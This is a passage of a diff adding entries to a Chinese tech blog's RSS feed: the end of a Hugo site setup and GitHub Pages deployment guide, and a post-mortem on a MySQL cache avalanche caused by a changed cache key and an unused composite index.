+  &lt;span style=&#34;color:#a6e22e&#34;&gt;favicon&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://avatars0.githubusercontent.com/u/14950473?s=40&amp;amp;v=4&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在模板&lt;code&gt;layouts/partials/site-favicon.html&lt;/code&gt;中使用：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;shortcut icon&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{{ .Site.Params.favicon }}&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;image/x-icon&amp;#34;&lt;/span&gt; /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在&lt;code&gt;config.toml&lt;/code&gt;中定义&lt;code&gt;menu&lt;/code&gt;，参考&lt;a href=&#34;https://gohugo.io/content-management/menus/&#34;&gt;文档&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-toml&#34; data-lang=&#34;toml&#34;&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;]
+  [[&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;]]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;identifier&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;about&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;关于&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;pre&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;i class=&amp;#39;fa fa-heart&amp;#39;&amp;gt;&amp;lt;/i&amp;gt;&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/about/&amp;#34;&lt;/span&gt;
+  [[&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;]]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;identifier&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Tags&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;标签&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;post&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;span class=&amp;#39;alert&amp;#39;&amp;gt;New!&amp;lt;/span&amp;gt;&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;pre&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;i class=&amp;#39;fa fa-road&amp;#39;&amp;gt;&amp;lt;/i&amp;gt;&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tags/&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在模板中使用：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;{{ if .Site.Menus.main }}
+  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;ul&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pl0 mr3&amp;#34;&lt;/span&gt;&amp;gt;
+    {{ range .Site.Menus.main }}
+    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;li&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;list f5 f4-ns fw4 dib pr3&amp;#34;&lt;/span&gt;&amp;gt;
+      &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hover-white no-underline white-90&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{{ .URL }}&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{{ .Name }} page&amp;#34;&lt;/span&gt;&amp;gt;
+        {{ .Name }}
+      &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
+    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;li&lt;/span&gt;&amp;gt;
+    {{ end }}
+  &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;ul&lt;/span&gt;&amp;gt;
+{{ end }}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在首页标题下添加时间&lt;/p&gt;
+&lt;p&gt;找到文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;layouts/index.html -&amp;gt; summary-with-image.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;summary-with-image.html&lt;/code&gt;文件是带图片和概要的文章列表，在显示标题的代码段添加显示日期的代码，如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;f3 fw1 athelas mt0 lh-title&amp;#34;&lt;/span&gt;&amp;gt;
+  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{{.URL}}&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;color-inherit dim link&amp;#34;&lt;/span&gt;&amp;gt;
+    {{ .Title }}
+    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
+&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;h4&lt;/span&gt;&amp;gt;{{ .Date.Format &amp;#34;January 2, 2006&amp;#34; }}&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;h4&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;f6 f5-l lh-copy nested-copy-line-height nested-links&amp;#34;&lt;/span&gt;&amp;gt;
+  {{ .Summary }}
+&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文章中嵌入图片&lt;/p&gt;
+&lt;p&gt;例如&lt;code&gt;![](/images/room_msg_lifetime.png)&lt;/code&gt;，则默认图片的存放路径是&lt;code&gt;static/images/room_msg_lifetime.png&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;如果public文件夹为空&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hugo --verbose&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;部署&#34;&gt;部署&lt;/h2&gt;
+&lt;p&gt;DNS设置&lt;code&gt;CNAME&lt;/code&gt;域名映射，新建一个&lt;code&gt;github&lt;/code&gt;项目，例如&lt;code&gt;kongoole.github.io&lt;/code&gt;，&lt;code&gt;clone&lt;/code&gt;到&lt;code&gt;hugo&lt;/code&gt;项目中的文件夹&lt;code&gt;public&lt;/code&gt;。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;git clone https://github.com/kongoole/kongoole.github.io public
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;部署到&lt;code&gt;github&lt;/code&gt;参考&lt;a href=&#34;https://gohugo.io/hosting-and-deployment/hosting-on-github/&#34;&gt;文档&lt;/a&gt;。&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>索引与缓存的坑</title>
+      <link>https://username.github.io/%E7%B4%A2%E5%BC%95%E4%B8%8E%E7%BC%93%E5%AD%98%E7%9A%84%E5%9D%91/</link>
+      <pubDate>Sun, 09 Jun 2019 21:45:40 +0800</pubDate>
+      <guid>https://username.github.io/%E7%B4%A2%E5%BC%95%E4%B8%8E%E7%BC%93%E5%AD%98%E7%9A%84%E5%9D%91/</guid>
+      <description>&lt;p&gt;以为是一次小改动，欢喜自测上线，没多久500扑面而来。上机器，看日志，数据库连接报错。本地客户端连连看，返回如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ERROR 1203 (42000): User xxx already has more than &#39;max_user_connections&#39; active connections
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当前用户的活跃连接超过了&lt;code&gt;max_user_connections&lt;/code&gt;的设置，根据&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.5/en/server-system-variables.html#sysvar_max_user_connections&#34;&gt;文档&lt;/a&gt;描述，该设置控制单个MySQL用户能够达到的并发连接数。超过此设置，MySQL连接失败，所有经过数据层的接口都会报500。&lt;/p&gt;
+&lt;p&gt;正常情况，这个项目典型的读多写少，读请求占97%以上，缓存早已稳稳加上，绝大多数读请求不会走到数据层，所以一个主库两个从库的连接数比例大概是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;S&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在QPS为300到1000的区间时，主库连接数维持在55左右，而两个从库的连接数均维持在20左右，可见大多数请求已被缓存拦下。但是在出现上面的报错时，主库连接数依然维持在55左右，而两个从库连接数则均达到1200左右，基本所有的压力都集中在了从库，典型的&lt;em&gt;缓存雪崩&lt;/em&gt;现象。为什么雪崩？别人家是缓存集中过期，而我们家业务代码修改了缓存key，导致缓存在“逻辑”上全部过期，雪崩。&lt;/p&gt;
+&lt;p&gt;如果只是数据层的机器出现访问压力，可能还扛得住。但读请求基本全在操作一张表，一千万左右记录，三列上建了唯一索引，例如&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以前的查询条件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;t_name&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;命中索引，但现在应业务要求要去掉&lt;code&gt;A=a&lt;/code&gt;，于是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;t_name&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不符合最左前缀策略，索引未命中，所有查询全表扫描，大量查询时间在60秒到140秒之间。&lt;/p&gt;
+&lt;p&gt;四台机器的&lt;code&gt;php-fpm&lt;/code&gt;进程数分别为500、500、900、450，而两个从库连接数2400左右，和所有机器进程数相近。可见，这种并发下所有机器的&lt;code&gt;php-fpm&lt;/code&gt;进程都在工作，每台机器都达到了&lt;code&gt;pm.max_children&lt;/code&gt;的设置。&lt;/p&gt;
+&lt;p&gt;怎么办？先回滚。&lt;/p&gt;
+&lt;p&gt;问题出现的逻辑：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;缓存key被修改&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;读库&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;索引没命中&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;数据库连接数过多&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;数据库连接失败&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种并发，即使雪崩，只要索引命中，读出的数据入缓存，等旧缓存失效，一切照旧。&lt;/p&gt;
+&lt;p&gt;调整索引列顺序：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;explain看看：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+----+-------------+---------+------+----------------+----------------+---------+-------------+------+-----------------------+&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;select_type&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;table&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;possible_keys&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;key_len&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ref&lt;/span&gt;         &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rows&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Extra&lt;/span&gt;                 &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;+----+-------------+---------+------+----------------+----------------+---------+-------------+------+-----------------------+&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SIMPLE&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xxxxxxx&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ref&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unq_xxx_xxx_xx&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unq_xxx_xxx_xx&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;304&lt;/span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;const&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Using&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;condition&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;+----+-------------+---------+------+----------------+----------------+---------+-------------+------+-----------------------+&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;row&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0.04&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sec&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;总结：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;再小的修改，都要考虑下性能、可用性、扩展性、安全性&lt;/li&gt;
+&lt;li&gt;想清楚开发、测试、线上环境的数量差异对程序性能的影响&lt;/li&gt;
+&lt;li&gt;上线前最好先预发布测试&lt;/li&gt;
+&lt;li&gt;访问频率高的缓存key修改后，先预热，避免数据库压力陡增&lt;/li&gt;
+&lt;li&gt;大数据量表查询一定要explain确认缓存是否命中&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;备注：&lt;/p&gt;
+&lt;p&gt;第三台机器内存&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;free&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;m&lt;/span&gt;
+               &lt;span style=&#34;color:#a6e22e&#34;&gt;total&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;used&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;free&lt;/span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;shared&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;buff&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cache&lt;/span&gt;   &lt;span style=&#34;color:#a6e22e&#34;&gt;available&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;Mem&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;          &lt;span style=&#34;color:#ae81ff&#34;&gt;15885&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;4016&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;6163&lt;/span&gt;         &lt;span style=&#34;color:#ae81ff&#34;&gt;837&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;5706&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;10531&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;Swap&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;          &lt;span style=&#34;color:#ae81ff&#34;&gt;2047&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;2047&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;平均每个php-fpm进程占内存16M左右&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ps&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;eo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pid&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;ppid&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;command&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mem&lt;/span&gt; &lt;span 